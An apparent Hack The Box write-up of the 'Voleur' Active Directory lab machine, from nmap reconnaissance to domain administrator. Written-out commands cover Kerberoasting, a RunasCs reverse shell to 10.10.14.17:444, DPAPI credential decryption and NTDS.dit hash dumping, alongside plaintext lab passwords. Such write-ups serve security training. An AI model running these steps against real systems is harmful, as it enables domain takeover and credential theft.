---
title: 'HTB-Voleur'
published: 2025-09-18
draft: false
toc: true
---
**Start 16:13 06-07-2025**

---
```
Scope:
10.10.11.76

Creds:
ryan.naylor / HollowOct31Nyt
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn voleur.htb 

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-06 22:15:11Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2222/tcp  open  ssh           syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
51685/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
51686/tcp open  msrpc         syn-ack Microsoft Windows RPC
51688/tcp open  msrpc         syn-ack Microsoft Windows RPC
51716/tcp open  msrpc         syn-ack Microsoft Windows RPC
62733/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 28661/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 35476/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m57s
| smb2-time: 
|   date: 2025-07-06T22:16:03
|_  start_date: N/A
```

I tried logging into ssh `2222` but got denied:

![](attachments/cb53e21a8fba641fed4364d54fe77fcd.png)

## Pass The Key - TGT

I started off changing `/etc/krb5.conf`

![](attachments/3040d5fc0ecb44e10c8791dcf46a38ef.png)

![](attachments/6e426de8cdd7c7d97d3cf186c861e577.png)

![](attachments/9672934a086d54def56bea89f2aca7c7.png)

![](attachments/547b89de2e5cfd31cee00a5044028417.png)

### BloodHound

I could now boot up `bloodhound`:

![](attachments/adedbe996f5aecefc5621dc3b051b21f.png)

![](attachments/f4f468b0ec26a0ff43d987e5534890f0.png)

While the files were ingesting I commenced my recon.

![](attachments/49ed0826faf3389ef0e7340262ba521b.png)

Quite a few _svc_ accounts which I made be able to take advantage of.

![](attachments/58910714492007bc5709ec76d1d8b265.png)

I went ahead and looked up which users had remote access:

![](attachments/c1005c3bdf2e7702d68e8c2f5a1754fe.png)

Nevertheless I had to move on and check out what else I could find.

## 445/TCP - SMB

![](attachments/61290034977a7f1a51d9c5615d63eaa8.png)

![](attachments/97dd1e11d39ce7729ff833111b49c437.png)

I find that I can read a bunch of shares! I'll check out the non-default IT share.

![](attachments/9b187b5dc9629c2d7e18ffec592abd19.png)

Right away I find an excel file that appears to be useful!

>[!note]
>I tried out `smbclient` but it wouldn't connect, instead I opted for `impacket-smbclient`:

![](attachments/1af35c17cccf34045251bd0d0a3074dc.png)

![](attachments/b308654d0e712cca430c7bd05f621817.png)

![](attachments/3f96fbc7d371de914356955bd0088d5b.png)

![](attachments/59d2992564068ff39bcba5e65af730da.png)

### John

Now it was time to crack the office hash:

![](attachments/32fcc451c214cde77e68f99cec165292.png)

I could now enter it in the prompt:

![](attachments/585044df17934cd24a9308503868d264.png)

### Excel file - Finding Creds

![](attachments/7f41d889781a169aa4b6066dfa38f67d.png)

Out of all the creds the *svc_ldap* ones worked as well:

![](attachments/d2ff59a09fd32a30b6788f4ac08c288f.png)

```creds
svc_ldap
M1XyC9pW7qT5Vn
```

Now that I know that that account has valid creds I return to `bloodhound`.

![](attachments/05682cab2c679644d99b55c80013bb9e.png)

>[!note]
>Not only can we go ahead and `WriteSPN` on *svc_winrm*, but we can also `GenericWrite` via **RESTORE_USERS** to *lacey.miller*. This means we can reinstate *todd.wolfe*'s account, and make him part of the domain admin group!

## WriteSPN
### Kerberoasting

![](attachments/2243c718568efb1f52981ca09af939ca.png)

I need to slightly modify the command for the request to work.

```bash
KRB5CCNAME=svc_ldap.ccache ./targetedKerberoast.py --dc-host DC.voleur.htb -d voleur.htb  --dc-ip 10.10.11.76 --request-user 'svc_winrm' -k
```

![](attachments/f6408fad2d784f345f94f28882556bfd.png)

### John

I was then able to easily crack it:

![](attachments/476409fe9069cc6522dc0ce199f22684.png)

```
svc_winrm
AFireInsidedeOzarctica980219afi
```

# Foothold
## Shell as svc_winrm

Using the following sequence of commands I was able to get easy access:

![](attachments/f1f06025c6ec176666f79a549cdefa2d.png)

### user.txt

![](attachments/0d87395cb04945eeca2d6cbd86dac8cb.png)

## Lateral Movement

>[!note]
>In order to move laterally I have to download over `RunasCs.exe`, then I can go ahead and get an elevated shell as *svc_ldap* on the system, which in turn will allow me to restore the *todd.wolfe* account.

![](attachments/51792b6db5ca81a9c1ed32504f039e1c.png)

![](attachments/98cefafb7cd65eb5ccc17244f1c119d3.png)

![](attachments/61d80f73a11b19f915c3d641a7d45330.png)

## Restore Todd.Wolfe account

I can now use the following commands to restore the account:

```powershell
Get-ADObjectÂ -FilterÂ 'isDeleted -eq $true'Â -IncludeDeletedObjects
```

![](attachments/4d2a45b0ae10f770670a58d915032ae9.png)

```powershell
Restore-ADObject -Identity '1c6b1deb-c372-4cbb-87b1-15031de169db'
```

![](attachments/d79f68b994c57324e1647c06a3ba0906.png)

### Shell as Todd.Wolfe

Now that the account has been restored I can yet again move laterally.

```bash
.\run.exe todd.wolfe NightT1meP1dg3on14  powershell -r 10.10.14.17:444
```

![](attachments/e08aff87ca11383d0aa7fc49d975227d.png)

![](attachments/c77ac1f82b53ce5e575ba1decd6a1b73.png)

Slight problem however concerning my enum, I'd have to use `bloodhound` all over again since the account did not exist before:

![](attachments/150958eed899d93c38562bf47b078e81.png)

## DPAPI

Knowing that he's part of the second-line group however I went to the following directory:

![](attachments/367e8c82f752879a2a345763ac305210.png)






I then transferred the following over:

```powershell
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
```

![](attachments/385679f9ebbf7dd220270c1edd1e07cb.png)

As well as:

```powershell
C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
```

![](attachments/e76bbd39bec534017a23638a8b190a38.png)

### impacket-dpapi

I can first crack the key:

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
```

![](attachments/2819075a4985f391111ade8b14b73551.png)

I can now crack the credentials:

```bash
impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

![](attachments/9056128b4c9cab105f123fe55d7cf46f.png)

```bash
jeremy.combs
qT3V9pLXyN7W4m
```

![](attachments/fe63acd8365416015f8de8ab4470ed77.png)

I can now easily log in as *jeremy*:

![](attachments/9fdaa4a1747f24c9e4b2936468c8b822.png)

# Privilege Escalation
## Enumeration

I started in the **Third-Line Support** folder:

![](attachments/9e1b5a27fe4dbe025e8c197afe5a911e.png)

I then download over the `id_rsa` and check who it belongs to:

```bash
ssh-keygen -lf id_rsa
```

![](attachments/529baf5211f3d6ced929c1d48ace3259.png)

I could easily get access:

![](attachments/0a94c29708a1bc7260db32620f44ef27.png)

Fortunately enough:

![](attachments/3bc4ec6aa16bcb587e783d268d0b99fb.png)

It was within the `/mnt` directory where I was able to find all the sweet stuff:

![](attachments/c615163371175474f4a1ea07a707cc71.png)

>[!note] 
>I could essentially copy over `NTDS.dit` now and get the Admin password!
>

To make my life easier I used `sudo su` and found the juicy stuff:

![](attachments/dcaf47b6ace61937cf0769c72f751bf6.png)

### NTDS.dit

I copied it over using the following command:

```bash
scpÂ -i id_rsaÂ -PÂ 2222Â -rÂ "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line Support/Backups"Â .
```

![](attachments/b4c4e824c7878c1fc52fd66f3039f6e6.png)

And in turn used `impacket-secretsdump` to dump the hashes:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL -hashes lmhash:nthash
```

![](attachments/012c3ee0c621336b2157436dd6d7e152.png)

## Shell as Administrator

I can now finally get the *Administrator* ticket and log in:

![](attachments/32bd3f1ec6d21c90a3b7a1391004b9b5.png)

### root.txt

![](attachments/c11889da3ced46474f76eb855de56054.png)

![](attachments/5f551d297e7b16ce7edf00cfcbca8876.png)

---

**Finished 16:45 10-07-2025**

[^Links]: [[Hack The Box]]

#pass-the-key #pass-the-ticket #BloodHound #ActiveDirectory #kerberoasting #dpapi 
